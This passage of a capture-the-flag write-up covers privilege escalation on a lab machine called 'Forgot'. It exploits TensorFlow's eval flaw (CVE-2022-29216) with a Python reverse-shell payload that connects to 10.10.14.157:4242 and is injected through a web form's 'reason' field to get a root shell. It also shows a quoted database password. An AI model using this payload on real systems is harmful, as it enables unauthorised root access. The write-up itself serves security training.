        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;%&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;+&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;%3C&#39;</span><span class="p">))</span>
        <span class="c1"># add feature for http count</span>
        <span class="n">feature8</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">))</span>

        <span class="c1"># append the features</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature1</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature2</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature3</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature4</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature5</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature6</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature7</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">,</span><span class="n">feature8</span><span class="p">)</span>
        <span class="n">features</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">featureVec</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">features</span>


<span class="c1"># Grab links</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connector</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="n">database</span><span class="o">=</span><span class="s1">&#39;app&#39;</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s1">&#39;diego&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;dCb#1!x0</span><span class="si">%g</span><span class="s1">jq&#39;</span><span class="p">)</span>
<span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;select reason from escalate&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()]</span>
<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">data</span><span class="o">=</span><span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
        <span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">Xnew</span> <span class="o">=</span> <span class="n">getVec</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="c1">#1 DecisionTreeClassifier</span>
<span class="n">ynew1</span> <span class="o">=</span> <span class="n">loaded_model1</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)</span>
<span class="c1">#2 SVC</span>
<span class="n">ynew2</span> <span class="o">=</span> <span class="n">loaded_model2</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)</span>
<span class="c1">#3 GaussianNB</span>
<span class="n">ynew3</span> <span class="o">=</span> <span class="n">loaded_model3</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)</span>
<span class="c1">#4 KNeighborsClassifier</span>
<span class="n">ynew4</span> <span class="o">=</span> <span class="n">loaded_model4</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)</span>
<span class="c1">#5 RandomForestClassifier</span>
<span class="n">ynew5</span> <span class="o">=</span> <span class="n">loaded_model5</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)</span>
<span class="c1">#6 MLPClassifier</span>
<span class="n">ynew6</span> <span class="o">=</span> <span class="n">loaded_model6</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)</span>

<span class="c1"># show the sample inputs and predicted outputs</span>
<span class="k">def</span><span class="w"> </span><span class="nf">assessData</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">score</span> <span class="o">=</span> <span class="p">((</span><span class="mf">.175</span><span class="o">*</span><span class="n">ynew1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(</span><span class="mf">.15</span><span class="o">*</span><span class="n">ynew2</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(</span><span class="mf">.05</span><span class="o">*</span><span class="n">ynew3</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(</span><span class="mf">.075</span><span class="o">*</span><span class="n">ynew4</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(</span><span class="mf">.25</span><span class="o">*</span><span class="n">ynew5</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(</span><span class="mf">.3</span><span class="o">*</span><span class="n">ynew6</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="k">if</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mf">.5</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="n">preprocess_input_exprs_arg_string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">safe</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Xnew</span><span class="p">)):</span>
     <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">assessData</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="p">,))</span>
<span class="c1">#     t.daemon = True</span>
     <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>diego@forgot://opt/security$<span class="w"> </span>pip<span class="w"> </span>show<span class="w"> </span>tensorflow
Name:<span class="w"> </span>tensorflow
Version:<span class="w"> </span><span class="m">2</span>.6.3
Summary:<span class="w"> </span>TensorFlow<span class="w"> </span>is<span class="w"> </span>an<span class="w"> </span>open<span class="w"> </span><span class="nb">source</span><span class="w"> </span>machine<span class="w"> </span>learning<span class="w"> </span>framework<span class="w"> </span><span class="k">for</span><span class="w"> </span>everyone.
Home-page:<span class="w"> </span>https://www.tensorflow.org/
Author:<span class="w"> </span>Google<span class="w"> </span>Inc.
Author-email:<span class="w"> </span>packages@tensorflow.org
License:<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.0
Location:<span class="w"> </span>/usr/local/lib/python3.8/dist-packages
Requires:<span class="w"> </span>numpy,<span class="w"> </span>google-pasta,<span class="w"> </span>wheel,<span class="w"> </span>keras-preprocessing,<span class="w"> </span>astunparse,<span class="w"> </span>clang,<span class="w"> </span>wrapt,<span class="w"> </span>grpcio,<span class="w"> </span>tensorflow-estimator,<span class="w"> </span>gast,<span class="w"> </span>termcolor,<span class="w"> </span>h5py,<span class="w"> </span>opt-einsum,<span class="w"> </span>typing-extensions,<span class="w"> </span>six,<span class="w"> </span>flatbuffers,<span class="w"> </span>absl-py,<span class="w"> </span>tensorboard,<span class="w"> </span>keras,<span class="w"> </span>protobuf
Required-by:
</pre></div>
</div>
</section>
<section id="cve-2022-29216">
<h2>CVE-2022-29216<a class="headerlink" href="#cve-2022-29216" title="Permalink to this heading">#</a></h2>
<p><a class="reference external" href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>saved_model_cli<span class="w"> </span>run<span class="w"> </span>--input_exprs<span class="w"> </span><span class="s1">&#39;hello=exec(&quot;&quot;&quot;import socket\nimport subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&quot;10.10.14.157&quot;,4242))\nsubprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&quot;&quot;&quot;)&#39;</span><span class="w"> </span>--dir<span class="w"> </span>./<span class="w"> </span>--tag_set<span class="w"> </span>serve<span class="w"> </span>--signature_def<span class="w"> </span>serving_default
</pre></div>
</div>
<p>^ this works but we probably need to trigger it directly from the script</p>
<p>In the custom script there is this</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">preprocess_input_exprs_arg_string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">safe</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</pre></div>
</div>
<p>The function comes from here:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">tensorflow.python.tools.saved_model_cli</span><span class="w"> </span><span class="kn">import</span> <span class="n">preprocess_input_exprs_arg_string</span>
</pre></div>
</div>
<p>And that corresponds exactly to the CVE mentioned above, where it still alows to run it through eval if safe is set to False.</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">preprocess_inputs_arg_string</span><span class="p">(</span><span class="n">inputs_str</span><span class="p">):</span>
<span class="w">  </span><span class="sd">&quot;&quot;&quot;Parses input arg into dictionary that maps input to file/variable tuple.</span>

<span class="sd">  Parses input string in the format of, for example,</span>
<span class="sd">  &quot;input1=filename1[variable_name1],input2=filename2&quot; into a</span>
<span class="sd">  dictionary looks like</span>
<span class="sd">  {&#39;input_key1&#39;: (filename1, variable_name1),</span>
<span class="sd">   &#39;input_key2&#39;: (file2, None)}</span>
<span class="sd">  , which maps input keys to a tuple of file name and variable name(None if</span>
<span class="sd">  empty).</span>

<span class="sd">  Args:</span>
<span class="sd">    inputs_str: A string that specified where to load inputs. Inputs are</span>
<span class="sd">    separated by semicolons.</span>
<span class="sd">        * For each input key:</span>
<span class="sd">            &#39;&lt;input_key&gt;=&lt;filename&gt;&#39; or</span>
<span class="sd">            &#39;&lt;input_key&gt;=&lt;filename&gt;[&lt;variable_name&gt;]&#39;</span>
<span class="sd">        * The optional &#39;variable_name&#39; key will be set to None if not specified.</span>

<span class="sd">  Returns:</span>
<span class="sd">    A dictionary that maps input keys to a tuple of file name and variable name.</span>

<span class="sd">  Raises:</span>
<span class="sd">    RuntimeError: An error when the given input string is in a bad format.</span>
<span class="sd">  &quot;&quot;&quot;</span>
  <span class="n">input_dict</span> <span class="o">=</span> <span class="p">{}</span>
  <span class="n">inputs_raw</span> <span class="o">=</span> <span class="n">inputs_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">input_raw</span> <span class="ow">in</span> <span class="nb">filter</span><span class="p">(</span><span class="nb">bool</span><span class="p">,</span> <span class="n">inputs_raw</span><span class="p">):</span>  <span class="c1"># skip empty strings</span>
    <span class="c1"># Format of input=filename[variable_name]&#39;</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([^=]+)=([^\[\]]+)\[([^\[\]]+)\]$&#39;</span><span class="p">,</span> <span class="n">input_raw</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
      <span class="n">input_dict</span><span class="p">[</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)]</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="c1"># Format of input=filename&#39;</span>
      <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([^=]+)=([^\[\]]+)$&#39;</span><span class="p">,</span> <span class="n">input_raw</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="n">input_dict</span><span class="p">[</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)]</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="kc">None</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span>
            <span class="s1">&#39;--inputs &quot;</span><span class="si">%s</span><span class="s1">&quot; format is incorrect. Please follow&#39;</span>
            <span class="s1">&#39;&quot;&lt;input_key&gt;=&lt;filename&gt;&quot;, or&#39;</span>
            <span class="s1">&#39;&quot;&lt;input_key&gt;=&lt;filename&gt;[&lt;variable_name&gt;]&quot;&#39;</span> <span class="o">%</span> <span class="n">input_raw</span><span class="p">)</span>

  <span class="k">return</span> <span class="n">input_dict</span>
</pre></div>
</div>
<p>The good news is, we controll the <code class="docutils literal notranslate"><span class="pre">inputs_str</span></code> variable through the reason field in the escalate endpoint.</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">hello</span><span class="o">=</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;import socket</span><span class="se">\n</span><span class="s2">import subprocess</span><span class="se">\n</span><span class="s2">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><span class="se">\n</span><span class="s2">s.connect((&quot;10.10.14.157&quot;,4242))</span><span class="se">\n</span><span class="s2">subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&quot;&quot;&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>Which means it’s just a matter of sending that the payload as <code class="docutils literal notranslate"><span class="pre">reason</span></code> in the url form:<br />
<img alt="controll.png" src="../../../../_images/controll.png" /></p>
<p>After that we’ll be able to see it in the database:</p>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="o">+</span><span class="c1">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">hello</span><span class="o">=</span><span class="k">exec</span><span class="p">(</span><span class="ss">&quot;&quot;&quot;import socket\nimport subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&quot;</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">157</span><span class="ss">&quot;,4242))\nsubprocess.call([&quot;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="ss">&quot;,&quot;</span><span class="o">-</span><span class="n">i</span><span class="ss">&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&quot;&quot;&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">|</span>
<span class="o">+</span><span class="c1">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span>
<span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span>
<span class="n">mysql</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Trigger the script with sudo and catch a reverse shell as root<br />
<img alt="shell.png" src="../../../../_images/shell1.png" /></p>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../format/format.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Format</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../faculty/faculty.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Faculty</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Forgot</a><ul>
<li><a class="reference internal" href="#enum">Enum</a></li>
<li><a class="reference internal" href="#forgot-password-feature">Forgot password feature</a></li>
<li><a class="reference internal" href="#enumerating-the-webapp-further-as-robert">Enumerating the webapp further as robert</a></li>
<li><a class="reference internal" href="#varnish-cache-poisoning">Varnish cache poisoning</a></li>
<li><a class="reference internal" href="#privesc-enum">Privesc enum</a></li>
<li><a class="reference internal" href="#cve-2022-29216">CVE-2022-29216</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
    <script src="../../../../_static/doctools.js?v=888ff710"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
    </body>
</html>